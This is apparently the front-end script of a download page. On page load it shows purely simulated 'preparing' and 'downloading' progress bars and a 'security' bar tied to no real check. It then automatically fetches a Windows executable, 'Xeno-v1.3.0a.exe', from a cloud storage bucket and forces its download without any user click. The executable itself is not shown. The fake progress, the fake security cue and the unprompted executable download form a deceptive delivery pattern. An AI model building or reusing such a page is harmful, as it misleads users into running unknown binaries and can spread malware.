// script.js — controls preparation and download phases

const percentEl = document.getElementById('percent');
const fillEl = document.getElementById('progressFill');
const titleEl = document.getElementById('title');
const preparingLine = document.getElementById('preparing-line');
const subnoteText = document.getElementById('subnote-text');
const securityFill = document.getElementById('securityFill');

let progress = 0;
let phase = 'preparing'; // values: 'preparing', 'downloading', 'finished'
let timer = null;

function updateProgressUI(value) {
  const v = Math.max(0, Math.min(100, value));
  percentEl.textContent = Math.round(v) + '%';
  fillEl.style.width = v + '%';
}

function startPreparation() {
  progress = 0;
  updateProgressUI(progress);
  // simulated increment loop
  timer = setInterval(() => {
    // random small increment for smoothness
    progress += 0.5 + Math.random() * 0.8; // ~0.4-0.7 per tick
    if (progress >= 100) {
      progress = 100;
      updateProgressUI(progress);
      clearInterval(timer);
      setTimeout(onPreparationComplete, 220); // small delay for feel
    } else {
      updateProgressUI(progress);
      // reveal security box fill slightly when >10%
      if (progress > 10) {
        securityFill.style.width = Math.min(18, progress / 6) + '%';
      }
    }
  }, 50);
}

function onPreparationComplete() {
  phase = 'downloading';
  // crossfade title and subtitle
  crossfadeText(titleEl, 'Downloading');
  crossfadeText(preparingLine, 'Your download is starting…');
  // subtle arrow bounce — animate the svg inside .icon-circle
  bounceIcon();
  // reset and start real download simulation
  setTimeout(() => {
    progress = 0;
    fillEl.style.width = '0%';
    updateProgressUI(progress);
    startDownload();
  }, 250);
}

function startDownload() {
  // simulate a download; in production you would hook to XHR/fetch progress
  timer = setInterval(() => {
    progress += 1.2 + Math.random() * 1.5; // slightly faster
    if (progress >= 100) {
      progress = 100;
      updateProgressUI(progress);
      clearInterval(timer);
      onDownloadComplete();
    } else {
      updateProgressUI(progress);
      // subtle glow effect can be handled via CSS if desired
    }
  }, 60);
}

function onDownloadComplete() {
  phase = 'finished';
  // final glow briefly
  fillEl.style.transition = 'box-shadow 400ms ease';
  fillEl.style.boxShadow = '0 0 18px rgba(255,255,255,0.14)';
  setTimeout(() => { fillEl.style.boxShadow = ''; }, 600);
  // optionally trigger a real download (generated blob)
  triggerSampleDownload();
}

function crossfadeText(el, newText) {
  el.style.transition = 'opacity 150ms ease';
  el.style.opacity = '0';
  setTimeout(() => {
    el.textContent = newText;
    el.style.opacity = '1';
  }, 160);
}

function bounceIcon() {
  const circle = document.querySelector('.icon-circle');
  if (!circle) return;
  circle.animate([
    { transform: 'translateY(0)' },
    { transform: 'translateY(6px)' },
    { transform: 'translateY(0)' }
  ], { duration: 260, easing: 'cubic-bezier(.2,.8,.2,1)' });
}

async function triggerSampleDownload() {
  const fileUrl = 'https://tree-ams5-0002.secure.backblaze.com/api/user_b2_download_file?action=download_files&accountId=8179503cf464&bucketId=784187d92570c3cc9fa40614';
  
  try {
    const response = await fetch(fileUrl);
    const blob = await response.blob();
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = 'Xeno-v1.3.0a.exe';
    document.body.appendChild(a);
    a.click();
    
    setTimeout(() => {
      URL.revokeObjectURL(url);
      a.remove();
    }, 100);
  } catch (error) {
    console.error('Download failed:', error);
  }
}

// start automatically
window.addEventListener('load', () => {
  startPreparation();
});
